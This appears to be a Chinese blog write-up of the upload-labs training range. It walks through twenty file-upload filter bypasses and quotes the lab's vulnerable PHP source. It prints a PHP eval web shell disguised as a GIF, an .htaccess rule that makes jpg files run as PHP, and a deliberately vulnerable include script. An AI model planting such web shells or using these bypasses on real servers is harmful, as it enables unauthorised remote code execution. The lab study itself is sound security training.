<div class="article_content clearfix" id="article_content">
<link href="style.css" rel="stylesheet"/>
<div class="htmledit_views" id="content_views">
<p id="main-toc"><strong>目录</strong></p>
<p id="Pass-01%20%E5%89%8D%E7%AB%AFjs%E9%AA%8C%E8%AF%81-toc" style="margin-left:0px;"><a href="#Pass-01%20%E5%89%8D%E7%AB%AFjs%E9%AA%8C%E8%AF%81" title="Pass-01 前端js验证">Pass-01 前端js验证</a></p>
<p id="Pass-02%20%E5%90%8E%E7%AB%AFMIME%E9%AA%8C%E8%AF%81-toc" style="margin-left:0px;"><a href="#Pass-02%20%E5%90%8E%E7%AB%AFMIME%E9%AA%8C%E8%AF%81" title="Pass-02 后端MIME验证">Pass-02 后端MIME验证</a></p>
<p id="Pass-03%20%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81-toc" style="margin-left:0px;"><a href="#Pass-03%20%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81" title="Pass-03 黑名单验证">Pass-03 黑名单验证</a></p>
<p id="Pass-04%20%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81.htaccess-toc" style="margin-left:0px;"><a href="#Pass-04%20%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81.htaccess" title="Pass-04 黑名单验证.htaccess">Pass-04 黑名单验证.htaccess</a></p>
<p id="Pass-05%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87-toc" style="margin-left:0px;"><a href="#Pass-05%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87" title="Pass-05大小写绕过">Pass-05大小写绕过</a></p>
<p id="Pass-6%20%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87-toc" style="margin-left:0px;"><a href="#Pass-6%20%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87" title="Pass-6 空格绕过">Pass-6 空格绕过</a></p>
<p id="Pass-07%20%E7%82%B9%E7%BB%95%E8%BF%87-toc" style="margin-left:0px;"><a href="#Pass-07%20%E7%82%B9%E7%BB%95%E8%BF%87" title="Pass-07 点绕过">Pass-07 点绕过</a></p>
<p id="Pass-08%20%3A%3A%24DATA%E7%BB%95%E8%BF%87-toc" style="margin-left:0px;"><a href="#Pass-08%20%3A%3A%24DATA%E7%BB%95%E8%BF%87" title="Pass-08 ::$DATA绕过">Pass-08 ::$DATA绕过</a></p>
<p id="Pass-09%C2%A0%E7%82%B9%2B%E7%A9%BA%E6%A0%BC%2B%E7%82%B9%2B%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87-toc" style="margin-left:0px;"><a href="#Pass-09%C2%A0%E7%82%B9%2B%E7%A9%BA%E6%A0%BC%2B%E7%82%B9%2B%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87" title="Pass-09 点+空格+点+空格绕过">Pass-09 点+空格+点+空格绕过</a></p>
<p id="Pass-10%C2%A0%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87-toc" style="margin-left:0px;"><a href="#Pass-10%C2%A0%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87" title="Pass-10 双写绕过">Pass-10 双写绕过</a></p>
<p id="%C2%A0Pass-11%C2%A000%E6%88%AA%E6%96%AD-toc" style="margin-left:0px;"><a href="#%C2%A0Pass-11%C2%A000%E6%88%AA%E6%96%AD" title=" Pass-11 00截断"> Pass-11 00截断</a></p>
<p id="Pass-12%2000%E6%88%AA%E6%96%AD-toc" style="margin-left:0px;"><a href="#Pass-12%2000%E6%88%AA%E6%96%AD" title="Pass-12 00截断">Pass-12 00截断</a></p>
<p id="Pass-13%20%E5%9B%BE%E7%89%87%E9%A9%AC%E7%BB%95%E8%BF%87-toc" style="margin-left:0px;"><a href="#Pass-13%20%E5%9B%BE%E7%89%87%E9%A9%AC%E7%BB%95%E8%BF%87" title="Pass-13 图片马绕过">Pass-13 图片马绕过</a></p>
<p id="Pass-14%20getimagesize()-%E5%9B%BE%E7%89%87%E9%A9%AC-toc" style="margin-left:0px;"><a href="#Pass-14%20getimagesize%28%29-%E5%9B%BE%E7%89%87%E9%A9%AC" title="Pass-14 getimagesize()-图片马">Pass-14 getimagesize()-图片马</a></p>
<p id="Pass-15-toc" style="margin-left:0px;"><a href="#Pass-15" title="Pass-15">Pass-15</a></p>
<p id="Pass-16%C2%A0%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87-toc" style="margin-left:0px;"><a href="#Pass-16%C2%A0%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87" title="Pass-16 二次渲染绕过">Pass-16 二次渲染绕过</a></p>
<p id="Pass-17%C2%A0%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89-toc" style="margin-left:0px;"><a href="#Pass-17%C2%A0%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89" title="Pass-17 条件竞争">Pass-17 条件竞争</a></p>
<p id="Pass-18-toc" style="margin-left:0px;"><a href="#Pass-18" title="Pass-18">Pass-18</a></p>
<p id="Pass-19%C2%A000%E6%88%AA%E6%96%AD-toc" style="margin-left:0px;"><a href="#Pass-19%C2%A000%E6%88%AA%E6%96%AD" title="Pass-19 00截断">Pass-19 00截断</a></p>
<p id="Pass-20-toc" style="margin-left:0px;"><a href="#Pass-20" title="Pass-20">Pass-20</a></p>
<p id="%E5%A4%87%E6%B3%A8-toc" style="margin-left:0px;"><a href="#%E5%A4%87%E6%B3%A8" title="备注">备注</a></p>
<hr id="hr-toc"/>
<h1 id="Pass-01%20%E5%89%8D%E7%AB%AFjs%E9%AA%8C%E8%AF%81">Pass-01 前端js验证</h1>
<p>尝试上传.php文件，提示不成功。只能上传图片类型的文件。 </p>
<p><img alt="" height="934" src="image\e56378ac0f58486eabe7a9b5c7d8aced.png" width="1200"/></p>
<p></p>
<p>分析原因：是因为前端js拦截了，我们先将php文件后缀修改成合法的格式（.gif ），在使用burpsuite抓包，再修改.php后缀。</p>
<p><img alt="" height="770" src="image\74a110d5df684a34b3410576264c7b08.png" width="1149"/></p>
<p></p>
<p>我们可以再upload的相应包中看一下我们是否将文件上传成功了。</p>
<p>可以看到我们成功的将一句话木马上传至靶场的服务器。</p>
<p>POST[] 中是自己的密码。</p>
<p></p>
<p><img alt="" height="647" src="image\1857c957f2734623bf324cc86c317e70.png" width="953"/></p>
<p></p>
<p>到这里以及成功了，我们可以尝试使用蚁剑连接。</p>
<p><img alt="" height="851" src="image\4ee9198e11a44a4182586168ad069987.png" width="1200"/></p>
<p><img alt="" height="850" src="image\2584aaca7c8147e69656df9d3739f556.png" width="1200"/></p>
<p></p>
<p></p>
<p></p>
<p></p>
<h1 id="Pass-02%20%E5%90%8E%E7%AB%AFMIME%E9%AA%8C%E8%AF%81">Pass-02 后端MIME验证</h1>
<p>补充知识：</p>
<p>Content-Type 实体头部用于指示资源的MIME类型</p>
<p>media type ,在响应中，Content-Type标头告诉客户端实际返回的内容的内容类型。</p>
<p></p>
<p>第一步还是尝试上传php文件</p>
<p><img alt="" height="960" src="image\99daaeb5cd0f44b69589614d28077bde.png" width="1200"/></p>
<p></p>
<p>发现与第一关的提示不同，不是根据文件的后缀进行识别。</p>
<p>分析源码：</p>
<p><img alt="" height="952" src="image\df8ea76283954463b00e6312109c512e.png" width="1200"/></p>
<p>发现这关只是对 content-type进行判断，在burp suite中，修改content-type为允许的类型就行了。</p>
<p></p>
<p>修改content-type</p>
<p><img alt="" height="774" src="image\4d889ab20d4346eea055e444fc1a6fe0.png" width="1149"/></p>
<p></p>
<p>上传成功。同时蚁剑也可以连接成功！</p>
<p></p>
<p><img alt="" height="480" src="image\ebd42d74095f4bb29ba6e83b309fe05b.png" width="754"/></p>
<h1 id="Pass-03%20%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81">Pass-03 黑名单验证</h1>
<p>尝试上传php文件，结合源码我们可以看出这关设置了文件后缀名黑名单，禁止上传后缀名为php的文件</p>
<p><img alt="" height="799" src="image\9cbf1c0484604c5e9cb5e51dde0ac86f.png" width="1200"/></p>
<p> <img alt="" height="608" src="image\a605ae7a569d4ba68947d33731d7c414.png" width="1149"/></p>
<p></p>
<p>我们尝试通过扩展名绕过，可以尝试phtml，php3，php4, php5, pht后缀名都可以绕过，但是前提是要在配置文件里面有这样的一句话</p>
<pre>AddType application/x-httpd-php .php .phtml .phps .php1 .php4 .pht 
</pre>
<p><img alt="" height="87" src="image\fd470206681145a1a311a418cdb990f8.png" width="1038"/></p>
<p></p>
<p>这句话的意思是可以 .phtml .phps 等后缀名的文件执行 php程序</p>
<p>我们上传1.phtml 文件</p>
<p><img alt="" height="195" src="image\e7b58bb9b59c42a3a9255e21e49046e3.png" width="718"/></p>
<p>上传成功</p>
<p>尝试使用蚁剑连接</p>
<p></p>
<h1 id="Pass-04%20%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81.htaccess">Pass-04 黑名单验证.htaccess</h1>
<p>分析源码：我们发现这一关的过滤比第三过更多了，使用第三关的方法是行不通了。</p>
<p>但是没有限制 .htaccess</p>
<p>补充知识：</p>
<p>        .htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置.通过htaccess文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
<p>        上传内容为一下代码的文件，<span style="color:#fe2c24;">双引号内为你要上传的文件名。</span></p>
<blockquote>
<p>&lt;FilesMatch "jpg"&gt;   <br/>         SetHandler application/x-httpd-php<br/> &lt;/FilesMatch&gt;</p>
</blockquote>
<p>        但是这个后缀名使用的前提是我们要在<code>apache</code>的<code>httpd.conf</code>中将<code>LoadModule rewrite_module modules/mod_rewrite.so</code>打开还有<code>AllowOverride All        </code></p>
<p><img alt="" height="603" src="image\241f4e676e4b45aa809a7ad85d1f275b.png" width="1200"/></p>
<p> 我们先上传  .htaccess 成功后再上传 .jpg文件</p>
<p></p>
<h1 id="Pass-05%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87">Pass-05大小写绕过</h1>
<p>我们尝试上传 .hatccess 文件，但提示 “此文件类型不允许上传！” 说明过滤了该文件。</p>
<p>我们查看源码：</p>
<p><img alt="" height="851" src="image\91bc82f9f6284916a7f6a9d9c54fa8fe.png" width="1200"/></p>
<p> 分析发现</p>
<p>第五关比第四关少了strtolower，这说明我们可以尝试大小写绕过。</p>
<pre><code>$file_ext = strtolower($file_ext); //转换为小写</code></pre>
<p>上传 .Php 文件，发现上传成功。</p>
<p><img alt="" height="1080" src="image\369b883dcf6b4ef5899da6f2675a8e2c.png" width="1200"/></p>
<p></p>
<h1 id="Pass-6%20%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87">Pass-6 空格绕过</h1>
<p>分析源码：</p>
<p>发现本关相比较前两关少了一步首尾去空的步骤，这样的话我们可以采取空格绕过</p>
<pre><code> $file_ext = trim($file_ext); //首尾去空
</code></pre>
<p><img alt="" height="818" src="image\2d6a07c7e7934d70a656312bb58c7bae.png" width="1200"/></p>
<p> 我们上传 .php (点+php+空格) 的文件，上传成功。</p>
<h1></h1>
<h1 id="Pass-07%20%E7%82%B9%E7%BB%95%E8%BF%87">Pass-07 点绕过</h1>
<p>分析源码：</p>
<p>相比较前几关，本关少了一下一步，这样的话就可以考虑从这里入手。</p>
<pre><code> $file_name = deldot($file_name);//删除文件名末尾的点</code></pre>
<p>利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过。</p>
<p><img alt="" height="852" src="image\fb218d6312214ae9aba975b3f15bf451.png" width="1200"/></p>
<h1></h1>
<h1 id="Pass-08%20%3A%3A%24DATA%E7%BB%95%E8%BF%87">Pass-08 ::$DATA绕过</h1>
<p>分析本关源码：</p>
<p>我们会发现本关少了去除字符串的一步，这里将是我们的入手点。</p>
<pre><code>$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA</code></pre>
<p><img alt="" height="821" src="image\a99a7b8c536943868e39ee303c32f7c5.png" width="1200"/></p>
<p>        在php+windows的情况下：如果文件名+"::$DATA"会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持"::$DATA"之前的文件名。利用windows特性，可在后缀名中加” ::$DATA”绕过。</p>
<h1 id="Pass-09%C2%A0%E7%82%B9%2B%E7%A9%BA%E6%A0%BC%2B%E7%82%B9%2B%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87">Pass-09 点+空格+点+空格绕过</h1>
<p>分析源码：</p>
<p>        先将首尾去空，又去除了<span style="color:#fe2c24;"><code>::$DATA</code></span>又转换为小写，再删去末尾的点。这样一来我们构造文件名，使其经过过滤后得到的还是<code>php</code>的文件名不就行了，所以就<span style="color:#fe2c24;"><code>1.php. .</code> </span>就可以绕过，也就是<span style="color:#fe2c24;"><code>点+空格+点+空格</code></span>绕过</p>
<p><img alt="" height="873" src="image\37d1de5b9f6e4e28ab99232e7bfc5580.png" width="1200"/></p>
<h1></h1>
<h1 id="Pass-10%C2%A0%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87">Pass-10 双写绕过</h1>
<p>        在分析源码前，我们可以不断地的通过burpsuite抓包模拟发送头信息，然后分析返回信息进行判断。</p>
<p>分析源码：</p>
<p>我们发现这里是将违规的后缀名全部替换成了空，但是他只替换一次，我们可以采用双写绕过。</p>
<p>比如  .php  -&gt; .pphphp</p>
<p><img alt="" height="645" src="image\78796c39c1ec406486ef09c177b41d60.png" width="1200"/></p>
<p>我们上传的文件名为： 10.pphphp </p>
<p>我们查看图片连接，会发现后缀名为 .php</p>
<p><img alt="" height="152" src="image\4989c126762b4cebb821615537b0af49.png" width="642"/></p>
<h1 id="%C2%A0Pass-11%C2%A000%E6%88%AA%E6%96%AD"> Pass-11 00截断</h1>
<p>分析源码：</p>
<p>白名单判断</p>
<p>但是$img_path这个变量直接是拼接的，所以我们可以使用<code>%00</code>截断绕过。</p>
<pre><code>$img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;</code></pre>
<p><code>%00</code>截断的条件是</p>
<blockquote>
<p><code>php</code>版本要小于5.3.4 修改<code>php.ini</code>的<code>magic_quotes_gpc</code>为<code>OFF</code>状态</p>
</blockquote>
<p><img alt="" height="565" src="image\fd0ed2c905c8410395345d1b9bd59344.png" width="1200"/></p>
<p> 修改save_path 路径，最后使用 %00 截断</p>
<p><img alt="" height="781" src="image\729e555cf1b34077a5b6c788284c7452.png" width="1156"/></p>
<p></p>
<h1 id="Pass-12%2000%E6%88%AA%E6%96%AD">Pass-12 00截断</h1>
<p>分析源码：</p>
<p><img alt="" height="610" src="image\558ff87a68824415ac9f5e432b1e29bd.png" width="1200"/></p>
<p> 用burp抓包，发现就是save_path post传参</p>
<p>用POST方式传参，应该也是<code>00</code>截断,但是不会像GET方式那样会对%00进行解码。</p>
<p>由于无法自行解码所以我们需要在<code>hex</code>中找到相对应的位置将数字修改为00</p>
<p></p>
<h1 id="Pass-13%20%E5%9B%BE%E7%89%87%E9%A9%AC%E7%BB%95%E8%BF%87">Pass-13 图片马绕过</h1>
<p>分析源码：   <span style="color:#fe2c24;"> $bin = fread($file, 2); //只读2字节</span></p>
<p>通过读取两个字节来确定文件类型，所以直接制作图片马即可</p>
<pre><code>function getReailFileType($filename){
    $file = fopen($filename, "rb");
    $bin = fread($file, 2); //只读2字节
    fclose($file);
    $strInfo = @unpack("C2chars", $bin);    
    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
    $fileType = '';    
    switch($typeCode){      
        case 255216:            
            $fileType = 'jpg';
            break;
        case 13780:            
            $fileType = 'png';
            break;        
        case 7173:            
            $fileType = 'gif';
            break;
        default:            
            $fileType = 'unknown';
        }    
        return $fileType;
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_type = getReailFileType($temp_file);

    if($file_type == 'unknown'){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}</code></pre>
<p>13.jpg</p>
<pre><code>GIF89a
&lt;?php @eval($_POST['shell']);?&gt;</code></pre>
<p>然后上传，但是直接访问并不能将<code>gif</code>当作<code>php</code>来解析,因此还需要利用文件包含漏洞</p>
<p>写一个<code>13.php</code>传入，再利用它来解析图片</p>
<pre><code>##include.php
&lt;?php
/*
本页面存在文件包含漏洞，用于测试图片马是否能正常运行！
*/
header("Content-Type:text/html;charset=utf-8");
$file = $_GET['file'];
if(isset($file)){
    include $file;
}else{
    show_source(__file__);
}
?&gt;</code></pre>
<p>再结合文件包含解析利用</p>
<pre><code>upload/include.php?file=upload/图片名称</code></pre>
<h1 id="Pass-14%20getimagesize()-%E5%9B%BE%E7%89%87%E9%A9%AC">Pass-14 getimagesize()-图片马</h1>
<p>分析源码：</p>
<p><img alt="" height="868" src="image\c9e46cfdb2aa41f2a59fc8eafbf42158.png" width="769"/></p>
<p>这一关通过getimagesize函数来获取图片信息，同样可以使用图片码绕过。</p>
<p><img alt="" height="786" src="image\9e8243a1b57e42d7bca8b02cd6638cdd.png" width="1075"/></p>
<p></p>
<h1 id="Pass-15">Pass-15</h1>
<p>分析源码：</p>
<pre><code>function isImage($filename){
    //需要开启php_exif模块
    $image_type = exif_imagetype($filename);
    switch ($image_type) {
        case IMAGETYPE_GIF:
            return "gif";
            break;
        case IMAGETYPE_JPEG:
            return "jpg";
            break;
        case IMAGETYPE_PNG:
            return "png";
            break;    
        default:
            return false;
            break;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}</code></pre>
<p>这里用到php_exif模块来判断文件类型，用图片马绕过，方法同pass-13</p>
<p></p>
<h1 id="Pass-16%C2%A0%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87">Pass-16 二次渲染绕过</h1>
<p>本人菜鸟请参考以下文章：</p>
<p><a class="link-info" href="https://xz.aliyun.com/t/2657#toc-13" title="请参考这篇文章">请参考这篇文章</a></p>
<p> 分析源码：</p>
<p>        判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染。</p>
<pre><code>$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,"."),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == "jpg") &amp;&amp; ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path))
        {
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = "该文件不是jpg格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".jpg";
                $newimagepath = UPLOAD_PATH.$newfilename;
                imagejpeg($im,$newimagepath);
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.$newfilename;
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "png") &amp;&amp; ($filetype=="image/png")){
        if(move_uploaded_file($tmpname,$target_path))
        {
            //使用上传的图片生成新的图片
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = "该文件不是png格式的图片！";
                @unlink($target_path);
            }else{
                 //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".png";
                $newimagepath = UPLOAD_PATH.$newfilename;
                imagepng($im,$newimagepath);
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.$newfilename;
                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "gif") &amp;&amp; ($filetype=="image/gif")){
        if(move_uploaded_file($tmpname,$target_path))
        {
            //使用上传的图片生成新的图片
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = "该文件不是gif格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".gif";
                $newimagepath = UPLOAD_PATH.$newfilename;
                imagegif($im,$newimagepath);
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.$newfilename;
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }
    }else{
        $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！";
    }
}</code></pre>
<h1 id="Pass-17%C2%A0%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89">Pass-17 条件竞争</h1>
<p>分析源码：</p>
<pre><code>$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}</code></pre>
<p>        这里是条件竞争，先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除，因此我们可以上传1.php只需要在它删除之前访问即可，可以利用burp的intruder模块不断上传，然后我们不断的访问刷新该地址即可。</p>
<h1 id="Pass-18">Pass-18</h1>
<p>分析源码：</p>
<pre><code>//index.php
$is_upload = false;
$msg = null;
if (isset($_POST['submit']))
{
    require_once("./myupload.php");
    $imgFileName =time();
    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
    $status_code = $u-&gt;upload(UPLOAD_PATH);
    switch ($status_code) {
        case 1:
            $is_upload = true;
            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;
            break;
        case 2:
            $msg = '文件已经被上传，但没有重命名。';
            break; 
        case -1:
            $msg = '这个文件不能上传到服务器的临时文件存储目录。';
            break; 
        case -2:
            $msg = '上传失败，上传目录不可写。';
            break; 
        case -3:
            $msg = '上传失败，无法上传该类型文件。';
            break; 
        case -4:
            $msg = '上传失败，上传的文件过大。';
            break; 
        case -5:
            $msg = '上传失败，服务器已经存在相同名称文件。';
            break; 
        case -6:
            $msg = '文件无法上传，文件不能复制到目标目录。';
            break;      
        default:
            $msg = '未知错误！';
            break;
    }
}

//myupload.php
class MyUpload{
......
......
...... 
  var $cls_arr_ext_accepted = array(
      ".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",
      ".html", ".xml", ".tiff", ".jpeg", ".png" );

......
......
......  
  /** upload()
   **
   ** Method to upload the file.
   ** This is the only method to call outside the class.
   ** @para String name of directory we upload to
   ** @returns void
  **/
  function upload( $dir ){
    
    $ret = $this-&gt;isUploadedFile();
    
    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );
    }

    $ret = $this-&gt;setDir( $dir );
    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );
    }

    $ret = $this-&gt;checkExtension();
    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );
    }

    $ret = $this-&gt;checkSize();
    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );    
    }
    
    // if flag to check if the file exists is set to 1
    
    if( $this-&gt;cls_file_exists == 1 ){
      
      $ret = $this-&gt;checkFileExists();
      if( $ret != 1 ){
        return $this-&gt;resultUpload( $ret );    
      }
    }

    // if we are here, we are ready to move the file to destination

    $ret = $this-&gt;move();
    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );    
    }

    // check if we need to rename the file

    if( $this-&gt;cls_rename_file == 1 ){
      $ret = $this-&gt;renameFile();
      if( $ret != 1 ){
        return $this-&gt;resultUpload( $ret );    
      }
    }
    
    // if we are here, everything worked as planned :)

    return $this-&gt;resultUpload( "SUCCESS" );
  
  }
......
......
...... 
};</code></pre>
<p>        这关也存在条件竞争的问题，不过这题对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，因此可以通过不断上传图片马，由于条件竞争可能来不及重命名，从而上传成功。</p>
<p></p>
<h1 id="Pass-19%C2%A000%E6%88%AA%E6%96%AD">Pass-19 00截断</h1>
<p>分析源码：</p>
<p>        发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过，方法同pass-12</p>
<pre><code>$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = $_POST['save_name'];
        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);

        if(!in_array($file_ext,$deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) { 
                $is_upload = true;
            }else{
                $msg = '上传出错！';
            }
        }else{
            $msg = '禁止保存为该类型文件！';
        }

    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}</code></pre>
<h1 id="Pass-20">Pass-20</h1>
<p>分析源码：</p>
<pre><code> $file = explode('.', strtolower($file));</code></pre>
<p>        通过源码发现该过滤方式是以explode()函数把字符串打散为数组，end() 函数将数组内部指针指向最后一个元素，并返回该元素的值（如果成功），这里是取post参数数组中的最后一个文件名。reset() 函数将内部指针指向数组中的第一个元素并输出。可控点为save_name。save_name[3]=conn19.php，save_name[5]=jpg，$ext=jpg过白名单，</p>
<p>        reset($file)=conn19.php $file[1]=nul，就成功上传conn19.php.(多出个点但是windows自动去掉了没影响)。还可以尝试，1=conn19，2=php，3=jpg，或者Pass19的00截断，0=conn19.php(0x00)，1=jpg</p>
<p></p>
<h1 id="%E5%A4%87%E6%B3%A8">备注</h1>
<p>        本人在学习过程中遇到了许多的BUG，无法解决，有点心态爆炸。但还是坚持将靶场打完，所以过程中缺少了许多实操的图片。</p>
<p>       我参考多篇文章后写下这篇文章，所以这不能算是我的原创把。大家感兴趣的话可以点击以下连接查看参考文章：</p>
<p>        <a class="link-info" href="https://www.cnblogs.com/whitedream-/p/14501515.html" title="参考文章一">参考文章一</a></p>
<p>        <a class="link-info" href="https://blog.csdn.net/weixin_44677409/article/details/92799366" title="参考文章二">参考文章二</a></p>
<p>        <a class="link-info" href="https://cloud.tencent.com/developer/article/1740497">参考文章三</a></p>
</div>
</div>